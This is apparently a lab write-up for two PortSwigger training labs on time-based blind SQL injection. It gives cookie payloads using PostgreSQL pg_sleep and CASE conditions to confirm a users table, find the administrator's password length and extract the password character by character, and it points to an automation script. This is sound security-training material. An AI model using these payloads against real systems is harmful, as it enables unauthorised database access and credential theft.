# Blind SQL injection-Time Based
## Summary
- [Lab13: Blind SQL injection with time delays](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Time%20Based/Blind%20SQL%20injection-Time%20Based.md#lab13-blind-sql-injection-with-time-delays)
- [Lab14: Blind SQL injection with time delays and information retrieval](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Time%20Based/Blind%20SQL%20injection-Time%20Based.md#lab14-blind-sql-injection-with-time-delays-and-information-retrieval)

### Lab13: Blind SQL injection with time delays
- We will resort to the time delay in the server response if our techniques in conditional responses have failed.
- So we will make an injected query to cause a time delay in the response of the server and monitor the time taken for the server to respond.
- If you tried all the syntax of the databases to trigger the time delay, The `pg_sleep()` function of the `PostgreSQL` will succeed. 
- We will trigger a time delay of 10 seconds.
```
TrackingId=xyz'|| pg_sleep(10)--
TrackingId=xyz'||(select pg_sleep(10))--
```
**- Here, we notice the server has taken more time to respond.**

![lab13_delay.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab13_delay.png)

----------------------------------------------------------------------

### Lab14: Blind SQL injection with time delays and information retrieval
- In the first, we will try to trigger a time delay in the server response.
- We will try to detect the type of database by trying all syntaxes of the databases.
- Check out the` conditional time delays` from the [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```
TrackingId=xyz'||(select pg_sleep(10))--
```
- After trying and testing, you will know It's a `PostgreSQL` database.
- In the previous labs we used the conditional response and the conditional errors, but now we will use the conditional time delays, also using the `CASE` statement or the `WHERE` clause.
- If our condition will be `True`, evaluate the action of delay, otherwise don't evaluate it.
- We will confirm if the `users` table exists or not.
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
TrackingId=xyz'||(select pg_sleep(10) from users)--
```
- These are forms to verify that the `administrator` exists in the `users` table.
- You can try any of these payloads.

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--

TrackingId=xyz'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users)--

TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator')--
```
- Now we need to know the password length of the administrator.
- You can use the intruder to brute force for the length and monitor the time of responses received.
```
TrackingId=xyz'||(SELECT CASE WHEN (LENGTH(password)=20 AND username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username='administrator')--

TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)=20)--
```
- Here, you will notice there is an over-in-time response of `10180 millis`, the delay has been succeeded with a payload of 20, so we have known that the password length is 20 char.

![lab14_password_length.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab14_password_length.png)

- The last phase, we will extract the admin password by retrieving that data as numbers, so we will use two important functions to do that:
	- `ASCII`, which returns the [ASCII](https://upload.wikimedia.org/wikipedia/commons/d/dd/ASCII-Table.svg) code for the input character.
	- `SUBSTRING` (or SUBSTR in Oracle), which returns a substring of its input.
- Check out how these functions work:
	- [SUBSTRING()](https://www.w3schools.com/sql/func_mysql_substring.asp)
	- [ASCII()](https://www.w3schools.com/sql/func_mysql_ascii.asp)

```
TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password,1,1))=111)--

TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTRING(password,1,1))=111 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```
- But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
- You will do the attack for these 2 positions: 
>ASCII(SUBSTR(password,`$1-20$`,1))=`$ASCII_numbers$`
- You can do that by using an intruder in the burp suite but it will take a long time to finish.
- We can write a python script to extract the password automatically.
- You can see my script from here:[SQLi_lab14_admin_password.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab14_admin_password.py)
- To run the script:
```
$ python3 SQLi_lab14_admin_password.py "Target_URl"
```
- Finally, we got the admin password.

![lab14_admin_password.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab14_admin_password.png)
